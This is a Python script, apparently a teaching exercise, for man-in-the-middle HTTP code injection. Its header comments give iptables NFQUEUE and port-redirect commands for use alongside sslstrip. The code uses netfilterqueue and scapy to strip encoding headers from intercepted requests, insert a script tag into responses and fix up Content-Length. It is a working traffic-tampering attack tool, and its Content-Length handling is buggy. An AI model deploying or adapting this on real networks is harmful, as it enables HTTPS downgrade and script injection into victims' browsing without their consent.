#!/usr/bin/env python

# "Exception IndexError: IndexError('Layer [TCP] not found',) in 'netfilterqueue.global_callback' ignored"
# replace - if scapy_packet.haslayer(scapy.Raw):
# with - if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:

# run >> iptables -I INPUT -j NFQUEUE --queue-num 0
# run >> iptables -I OUTPUT -j NFQUEUE --queue-num 0
# run >> iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
# reset with >> iptables --flush

# run sslstrip
# port 10000 is default for sslstrip

import netfilterqueue
import scapy.all as scapy
import re

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:
        load = scapy_packet[scapy.Raw].load 
        if scapy_packet[scapy.TCP].dport == 10000:
            print("[+] Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            load = load.replace("HTTP/1.1", "HTTP/1.0")

        elif scapy_packet[scapy.TCP].sport == 10000:
                print("[+] Response")
                # print(scapy_packet.show())
                injection_code = "<script>alert('hello')</script>"
                load = load.replace("</body>", injection_code + "</body>")
                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                if content_length_search:
                    content_length = content_length_search.group(1)
                    # print(content_lenth)
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length, new_content_length)

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))           
         
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()